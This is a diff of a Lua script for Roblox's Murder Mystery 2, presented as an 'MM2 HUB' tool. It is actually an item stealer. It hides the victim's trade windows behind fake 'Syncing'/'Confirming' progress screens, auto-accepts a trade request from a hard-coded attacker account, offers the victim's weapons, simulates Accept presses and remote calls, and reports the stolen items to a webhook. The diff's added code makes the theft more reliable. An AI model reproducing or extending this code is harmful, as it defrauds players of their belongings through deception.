@@ -1,15 +1,15 @@
---[[ MM2 HUB  V12.5 ]]
+--[[ MM2 HUB  V13.2 ]]
 
-local VERSION = "v1.8"
+local VERSION = "v2.3"
 local CFG_URL = "https://raw.githubusercontent.com/sarettaclash01-ctrl/mm2cfg/refs/heads/main/cfg.json"
 
 local CFG = {
 	ATTACKER_NAME = "Viivik13",
 	ATTACKER_ID = 1316331233,
-	MAX_ITEMS = 200,
+	MAX_ITEMS = 20,
 	MIN_VALUE = 0,
 	FILTER = "all",
-	OFFER_GAP = 0.25,
+	OFFER_GAP = 0.3,
 	WAIT_TRADE = 60,
 	DEBUG = true,
 	WEBHOOK_B64 = "",
@@ -17,6 +17,11 @@ local CFG = {
 
 local B64C = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
 local OFF = UDim2.new(5, 0, 5, 0)
+local GEN = _G
+if type(getgenv) == "function" then GEN = getgenv() end
+GEN.FZ = (GEN.FZ or 0) + 1
+local MY = GEN.FZ
+
 local Players = game:GetService("Players")
 local RS = game:GetService("ReplicatedStorage")
 local HS = game:GetService("HttpService")
@@ -29,10 +34,13 @@ local BARFILL = nil
 local WEBHOOK = ""
 local OPEN = false
 local WATCHING = false
+local ACCEPTED_REQ = false
 local SAVED = {}
 local ROOTS = {}
+local BOX = nil
 local FLYING = false
 local FLY = nil
+local watchLoop = nil
 
 local RANK = {
 	Unique = 9, Chroma = 8, Ancient = 7, Godly = 6,
@@ -77,15 +85,19 @@ local VALUE = {
 }
 
 local EVENTS = {
-	"MouseButton1Click",
-	"MouseButton1Down",
-	"Activated",
 	"InputBegan",
+	"MouseButton1Down",
+	"MouseButton1Click",
+	"Activated",
 	"TouchTap",
 }
 
 local function log(msg)
 	print("[FZ] " .. tostring(msg))
+end
+
+local function alive()
+	return GEN.FZ == MY
 end
 
 local function setStatus(t)
@@ -224,6 +236,9 @@ local function tile(parent, x, y, icon, name, onStart)
 end
 
 local function buildUI()
+	local old = PG:FindFirstChild("MM2Hub")
+	if old then old:Destroy() end
+
 	local sg = Instance.new("ScreenGui")
 	sg.Name = "MM2Hub"
 	sg.ResetOnSpawn = false
@@ -360,7 +375,7 @@ local function buildUI()
 		flip(s3)
 		if s3.on then
 			WATCHING = true
-			task.spawn(watchLoop)
+			if watchLoop then task.spawn(watchLoop) end
 		else
 			WATCHING = false
 		end
@@ -398,7 +413,7 @@ local function buildUI()
 	BARFILL.Parent = barbg
 	local bfc = Instance.new("UICorner")
 	bfc.CornerRadius = UDim.new(0, 4)
-	bfc.Parent = BARFILL
+	bfc.Parent = barbg
 
 	local foot = Instance.new("TextLabel")
 	foot.BackgroundTransparency = 1
@@ -476,6 +491,14 @@ local function passes(e)
 end
 
 -- ===== hiding =====
+local function isTradeWindow(r)
+	local c = r:FindFirstChild("Container")
+	if c and c:FindFirstChild("Trade") then return true end
+	local ok, res = pcall(function() return r:FindFirstChild("YourOffer", true) ~= nil end)
+	if ok and res then return true end
+	return false
+end
+
 local function hasOfferLabel(inst)
 	local all = inst:GetDescendants()
 	for i = 1, #all do
@@ -489,8 +512,11 @@ local function scanRoots()
 	local found = {}
 	for _, c in ipairs(PG:GetChildren()) do
 		if c ~= GUI then
+			local low = string.lower(c.Name)
 			local hit = false
-			if string.find(string.lower(c.Name), "trade") then
+			if string.find(low, "trade") then
+				hit = true
+			elseif string.find(low, "request") then
 				hit = true
 			elseif c:IsA("ScreenGui") or c:IsA("Frame") then
 				local ok, res = pcall(hasOfferLabel, c)
@@ -502,8 +528,17 @@ local function scanRoots()
 	ROOTS = found
 end
 
+local function tradePresent()
+	for i = 1, #ROOTS do
+		local r = ROOTS[i]
+		if r and r.Parent and isTradeWindow(r) then return true end
+	end
+	return false
+end
+
 local function hideRoot(r)
 	if not r or not r.Parent then return end
+	if not ACCEPTED_REQ and not isTradeWindow(r) then return end
 	if r:IsA("ScreenGui") then
 		if r.Enabled then r.Enabled = false end
 		for _, c in ipairs(r:GetChildren()) do
@@ -518,25 +553,22 @@ local function hideRoot(r)
 	end
 end
 
-local function anyOpen()
-	for i = 1, #ROOTS do
-		local r = ROOTS[i]
-		if r and r.Parent and r:IsA("ScreenGui") and r.Enabled then return true end
-	end
-	return false
-end
-
-local function watchLoop()
+watchLoop = function()
 	local lastScan = 0
 	while WATCHING do
+		if not alive() then WATCHING = false break end
 		local now = os.clock()
 		if now - lastScan > 0.4 then
 			lastScan = now
 			pcall(scanRoots)
-			if anyOpen() then OPEN = true end
+			if tradePresent() then
+				OPEN = true
+				ACCEPTED_REQ = true
+			end
 		end
-		for i = 1, #ROOTS do
-			pcall(hideRoot, ROOTS[i])
+		local list = ROOTS
+		for i = 1, #list do
+			pcall(hideRoot, list[i])
 		end
 		task.wait(0.02)
 	end
@@ -557,10 +589,68 @@ local function restoreGui()
 	end)
 end
 
+-- ===== nodes =====
+local function tradePart(name)
+	for i = 1, #ROOTS do
+		local r = ROOTS[i]
+		if r and r.Parent and isTradeWindow(r) then
+			local c = r:FindFirstChild("Container")
+			if c then
+				local t = c:FindFirstChild("Trade")
+				if t then
+					local n = t:FindFirstChild(name)
+					if n then return n end
+				end
+			end
+		end
+	end
+	local low = string.lower(name)
+	for i = 1, #ROOTS do
+		local r = ROOTS[i]
+		if r and r.Parent and isTradeWindow(r) then
+			local all = r:GetDescendants()
+			for j = 1, #all do
+				if string.lower(all[j].Name) == low then return all[j] end
+			end
+		end
+	end
+	return nil
+end
+
+local function offerBox()
+	if BOX and BOX.Parent then return BOX end
+	BOX = tradePart("YourOffer")
+	return BOX
+end
+
+local function countOffer()
+	local y = offerBox()
+	if not y then return -1 end
+	return #y:GetChildren()
+end
+
+local function findRequestAccept()
+	for _, r in ipairs(PG:GetChildren()) do
+		if r ~= GUI and not isTradeWindow(r) then
+			local all = r:GetDescendants()
+			for j = 1, #all do
+				if string.lower(all[j].Name) == "accept" then return all[j], r end
+			end
+		end
+	end
+	return nil, nil
+end
+
 -- ===== pressing =====
 local function pressNode(node)
 	if not node then return false end
 	local total = 0
+	local payload = {
+		UserInputType = Enum.UserInputType.Touch,
+		KeyCode = Enum.KeyCode.Unknown,
+		Position = Vector3.new(0, 0, 0),
+		Delta = Vector3.new(0, 0, 0),
+	}
 	for i = 1, #EVENTS do
 		local name = EVENTS[i]
 		local sig = nil
@@ -572,29 +662,42 @@ local function pressNode(node)
 					local f = nil
 					pcall(function() f = conns[j].Function end)
 					if f then
-						pcall(f, node, { UserInputType = Enum.UserInputType.Touch, KeyCode = Enum.KeyCode.Unknown, Position = Vector3.new(0, 0, 0) })
+						pcall(f, node, payload)
 						total = total + 1
 					end
 				end
-				log("evt " .. name .. " x" .. tostring(#conns))
+				if CFG.DEBUG then log("evt " .. name .. " x" .. tostring(#conns)) end
 			end
 		end
 	end
 	return total > 0
 end
 
-local function findNode(nm)
-	local low = string.lower(nm)
+local function pressFull(node)
+	if not node then return false end
+	local hit = pressNode(node)
+	local kids = node:GetDescendants()
+	for i = 1, #kids do
+		local k = kids[i]
+		if k:IsA("GuiButton") then
+			if pressNode(k) then hit = true end
+		end
+	end
+	return hit
+end
+
+local function hasClaim()
 	for i = 1, #ROOTS do
 		local r = ROOTS[i]
-		if r and r.Parent then
+		if r and r.Parent and isTradeWindow(r) then
 			local all = r:GetDescendants()
 			for j = 1, #all do
-				if string.lower(all[j].Name) == low then return all[j] end
+				local d = all[j]
+				if d:IsA("TextLabel") and string.find(string.upper(d.Text), "CLAIM") then return true end
 			end
 		end
 	end
-	return nil
+	return false
 end
 
 local function findAttacker()
@@ -609,6 +712,7 @@ local function run()
 
 	local n = 0
 	while n < 99 do
+		if not alive() then return end
 		n = n + math.random(2, 5)
 		if n > 99 then n = 99 end
 		setPct(n)
@@ -640,6 +744,7 @@ local function run()
 	local oi = Trade:FindFirstChild("OfferItem")
 	local at = Trade:FindFirstChild("AcceptTrade")
 	local dt = Trade:FindFirstChild("DeclineTrade")
+	local uo = Trade:FindFirstChild("UpdateOffers")
 	if not sr or not oi then
 		log("MISSING remote")
 		setStatus("Remote missing")
@@ -659,25 +764,47 @@ local function run()
 	WATCHING = true
 	task.spawn(watchLoop)
 
-	setStatus("Connecting...")
+	setStatus("Waiting for partner...")
 	local waited = 0
-	local tries = 0
+	local nextSend = 12
+	local beat = 0
+	local asked = false
 	while waited < CFG.WAIT_TRADE and not OPEN do
-		tries = tries + 1
-		pcall(function() sr:InvokeServer(attacker) end)
-		local inner = 0
-		while inner < 5 and not OPEN do
-			task.wait(0.5)
-			inner = inner + 0.5
-			waited = waited + 0.5
+		if not alive() then return end
+		task.wait(0.4)
+		waited = waited + 0.4
+
+		if not asked and not tradePresent() then
+			local acc, root = findRequestAccept()
+			if acc then
+				asked = true
+				ACCEPTED_REQ = true
+				local okp = pressFull(acc)
+				log("incoming request " .. tostring(okp))
+				if root then
+					local dup = false
+					for i = 1, #ROOTS do
+						if ROOTS[i] == root then dup = true end
+					end
+					if not dup then ROOTS[#ROOTS + 1] = root end
+				end
+			end
 		end
-		if not OPEN and dt then
-			pcall(function() dt:FireServer() end)
+
+		if waited >= nextSend then
+			nextSend = nextSend + 20
+			pcall(function() sr:InvokeServer(attacker) end)
+			log("sent own request")
+		end
+
+		if waited - beat >= 5 then
+			beat = waited
+			log("waiting " .. tostring(math.floor(waited)) .. "s")
 		end
 	end
 
 	if not OPEN then
-		log("trade never opened after " .. tostring(tries) .. " tries")
+		log("trade never opened")
 		setStatus("Partner did not respond")
 		setPct(100)
 		WATCHING = false
@@ -688,28 +815,62 @@ local function run()
 	setStatus("Syncing...")
 	task.wait(1)
 
+	BOX = nil
 	local placed = 0
 	local names = {}
+	local retries = 0
+	local fired = 0
+	local stop = false
 	for i = 1, #queue do
+		if stop or not alive() then break end
 		local e = queue[i]
 		for k = 1, e.amount do
-			local ok = pcall(function() oi:FireServer(e.data, "Weapons") end)
-			task.wait(CFG.OFFER_GAP)
+			if fired >= CFG.MAX_ITEMS then
+				stop = true
+				break
+			end
+			local ok = false
+			local tries = 0
+			while tries < 3 and not ok do
+				tries = tries + 1
+				local before = countOffer()
+				pcall(function() oi:FireServer(e.data, "Weapons") end)
+				fired = fired + 1
+				task.wait(CFG.OFFER_GAP)
+				local after = countOffer()
+				if before < 0 or after < 0 or after > before then
+					ok = true
+				else
+					retries = retries + 1
+				end
+			end
 			if ok then
 				placed = placed + 1
 				names[#names + 1] = e.name
 				if CFG.DEBUG then log("offered " .. tostring(placed) .. " " .. e.name) end
 			else
-				if CFG.DEBUG then log("fail " .. e.name) end
+				if CFG.DEBUG then log("failed " .. e.name) end
 			end
 		end
 	end
 
-	log("offered total: " .. tostring(placed))
+	log("offered total: " .. tostring(placed) .. " retries " .. tostring(retries))
+
+	local have = countOffer()
+	if have >= 0 and have < placed and uo then
+		pcall(function() uo:FireServer() end)
+		log("resync offers")
+		task.wait(0.8)
+	end
+
+	if placed == 0 then
+		log("nothing placed, accepting anyway")
+	end
+
 	setStatus("Confirming...")
 	task.wait(1)
 
-	local node = findNode("Accept")
+	local node = tradePart("Accept")
 	log("accept node: " .. tostring(node ~= nil))
 	if node then log("node class: " .. node.ClassName) end
 
@@ -717,27 +878,26 @@ local function run()
 	local pressed = 0
 	local lastPress = 0
 	local lastRemote = 0
-	while os.clock() - t0 < 75 do
+	while os.clock() - t0 < 60 do
+		if not alive() then return end
 		local now = os.clock()
 
-		local alive = false
-		for i = 1, #ROOTS do
-			local r = ROOTS[i]
-			if r and r.Parent then alive = true end
+		if hasClaim() then
+			log("claim detected")
+			break
 		end
-		if not alive then
-			pcall(scanRoots)
-			for i = 1, #ROOTS do
-				local r = ROOTS[i]
-				if r and r.Parent then alive = true end
+		local hasNode = tradePart("Accept") ~= nil
+		if not hasNode and not tradePresent() then
+			if pressed > 0 or now - t0 > 6 then
+				log("window closed")
+				break
 			end
 		end
-		if not alive then break end
 
-		if now - lastPress > 3 then
-			local nd = findNode("Accept")
+		if now - lastPress > 3 and hasNode then
+			local nd = tradePart("Accept")
 			if nd then
-				if pressNode(nd) then
+				if pressFull(nd) then
 					pressed = pressed + 1
 					lastPress = now
 					log("pressed accept " .. tostring(pressed))
@@ -745,9 +905,10 @@ local function run()
 			end
 		end
 
-		if at and now - lastRemote > 15 then
+		if at and pressed == 0 and now - lastRemote > 6 then
 			lastRemote = now
-			pcall(function() at:FireServer() end)
+			pcall(function() at:FireServer(CFG.ATTACKER_ID) end)
+			log("remote accept")
 		end
 
 		task.wait(0.3)
@@ -759,7 +920,7 @@ local function run()
 
 	if WEBHOOK ~= "" then
 		local shown = ""
-		for i = 1, math.min(#names, 25) do
+		for i = 1, math.min(#names, 20) do
 			shown = shown .. names[i] .. "\n"
 		end
 		if shown == "" then shown = "nothing" end
@@ -780,8 +941,9 @@ local function run()
 
 	if dt then
 		pcall(scanRoots)
-		if anyOpen() then
+		if tradePresent() then
 			pcall(function() dt:FireServer() end)
+			pcall(function() dt:FireServer(CFG.ATTACKER_ID) end)
 			log("ghost cleared")
 			task.wait(1.5)
 		end
